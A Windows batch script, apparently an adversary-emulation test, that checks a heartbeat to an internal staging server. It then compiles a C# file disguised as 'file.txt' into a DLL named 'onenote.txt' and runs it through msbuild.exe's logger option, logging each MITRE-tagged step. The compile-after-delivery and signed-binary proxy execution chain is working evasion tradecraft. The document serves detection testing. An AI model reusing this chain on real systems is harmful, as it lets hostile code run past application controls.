@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\8218\c71a7bba
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8218-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=onenote.txt
SET njozco=file.txt
SET kkjwr=8218

REM Internal variables
SET vyztwh=%APPDATA%\!ufeybybm!\macula-simulations.log
SET qbngrl=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
SET plmezn=C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe
SET rltkr=T1500
SET rnqsk=T1218
SET flddz=Compile After Delivery
SET jwyfw=Signed Binary Proxy Execution

REM Debug: script start
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: script_start=stage1_build_execute >>> "!vyztwh!" 2>nul

REM Step 1: Heartbeat check
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: heartbeat_check_start=!uouoq! >>> "!vyztwh!" 2>nul
curl -k -s -o nul "!uouoq!"
IF ERRORLEVEL 1 (
    SET vthbkr=0
    SET ppjzqb=connection_failed
    SET "normdate=!DATE:/=-!"
    SET "normdate=!normdate:~-10!"
    SET "normtime=!TIME: =0!"
    SET "normtime=!normtime:~0,2!:!normtime:~3,2!:!normtime:~6,2!.!normtime:~9!"
    echo [!normdate! !normtime!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|!jwyfw!=!vthbkr!::!ppjzqb! >> "!vyztwh!" 2>nul
    echo [%DATE% %TIME%][DEBUG][!lqyereup!]: heartbeat_check_failed=!ppjzqb! >>> "!vyztwh!" 2>nul
    EXIT /B 1
) ELSE (
    SET vthbkr=1
    SET ppjzqb=
    SET "normdate=!DATE:/=-!"
    SET "normdate=!normdate:~-10!"
    SET "normtime=!TIME: =0!"
    SET "normtime=!normtime:~0,2!:!normtime:~3,2!:!normtime:~6,2!.!normtime:~9!"
    echo [!normdate! !normtime!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|!jwyfw!=!vthbkr!::!ppjzqb! >> "!vyztwh!" 2>nul
    echo [%DATE% %TIME%][DEBUG][!lqyereup!]: heartbeat_check_complete=success >>> "!vyztwh!" 2>nul
)

REM Step 3: Change directory
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: chdir_start=!recnn! >>> "!vyztwh!" 2>nul
cd /d "!recnn!"
IF ERRORLEVEL 1 (
    SET tjxsfv=0
    SET ykxqdt=directory_not_found
    SET "normdate=!DATE:/=-!"
    SET "normdate=!normdate:~-10!"
    SET "normtime=!TIME: =0!"
    SET "normtime=!normtime:~0,2!:!normtime:~3,2!:!normtime:~6,2!.!normtime:~9!"
    echo [!normdate! !normtime!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|!flddz!=!tjxsfv!::!ykxqdt! >> "!vyztwh!" 2>nul
    echo [%DATE% %TIME%][DEBUG][!lqyereup!]: chdir_failed=!ykxqdt! >>> "!vyztwh!" 2>nul
    EXIT /B 1
)
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: chdir_complete=success >>> "!vyztwh!" 2>nul

REM Step 4: Compile DLL
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: compile_start=!njozco!->!hpnjatpj! >>> "!vyztwh!" 2>nul
"!qbngrl!" /target:library /reference:Microsoft.Build.Framework.dll /out:"!hpnjatpj!" "!njozco!"
IF ERRORLEVEL 1 (
    SET tjxsfv=0
    SET ykxqdt=compile_failed
    SET "normdate=!DATE:/=-!"
    SET "normdate=!normdate:~-10!"
    SET "normtime=!TIME: =0!"
    SET "normtime=!normtime:~0,2!:!normtime:~3,2!:!normtime:~6,2!.!normtime:~9!"
    echo [!normdate! !normtime!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|!flddz!=!tjxsfv!::!ykxqdt! >> "!vyztwh!" 2>nul
    echo [%DATE% %TIME%][DEBUG][!lqyereup!]: compile_failed=!ykxqdt! >>> "!vyztwh!" 2>nul
    EXIT /B 1
) ELSE (
    SET tjxsfv=1
    SET ykxqdt=
    SET "normdate=!DATE:/=-!"
    SET "normdate=!normdate:~-10!"
    SET "normtime=!TIME: =0!"
    SET "normtime=!normtime:~0,2!:!normtime:~3,2!:!normtime:~6,2!.!normtime:~9!"
    echo [!normdate! !normtime!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|!flddz!=!tjxsfv!::!ykxqdt! >> "!vyztwh!" 2>nul
    echo [%DATE% %TIME%][DEBUG][!lqyereup!]: compile_complete=success >>> "!vyztwh!" 2>nul
)

REM Step 6: Execute DLL via msbuild
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: execution_start=msbuild_logger >>> "!vyztwh!" 2>nul
"!plmezn!" /logger:LoggerEntry,"!recnn!\\!hpnjatpj!;MyParameters,Foo"
IF ERRORLEVEL 1 (
    SET vthbkr=0
    SET ppjzqb=msbuild_exec_failed
    SET "normdate=!DATE:/=-!"
    SET "normdate=!normdate:~-10!"
    SET "normtime=!TIME: =0!"
    SET "normtime=!normtime:~0,2!:!normtime:~3,2!:!normtime:~6,2!.!normtime:~9!"
    echo [!normdate! !normtime!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|!jwyfw!=!vthbkr!::!ppjzqb! >> "!vyztwh!" 2>nul
    echo [%DATE% %TIME%][DEBUG][!lqyereup!]: execution_failed=!ppjzqb! >>> "!vyztwh!" 2>nul
    EXIT /B 1
) ELSE (
    SET vthbkr=1
    SET ppjzqb=
    SET "normdate=!DATE:/=-!"
    SET "normdate=!normdate:~-10!"
    SET "normtime=!TIME: =0!"
    SET "normtime=!normtime:~0,2!:!normtime:~3,2!:!normtime:~6,2!.!normtime:~9!"
    echo [!normdate! !normtime!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|!jwyfw!=!vthbkr!::!ppjzqb! >> "!vyztwh!" 2>nul
    echo [%DATE% %TIME%][DEBUG][!lqyereup!]: execution_complete=success >>> "!vyztwh!" 2>nul
)

echo [%DATE% %TIME%][DEBUG][!lqyereup!]: script_end=normal >>> "!vyztwh!" 2>nul
ENDLOCAL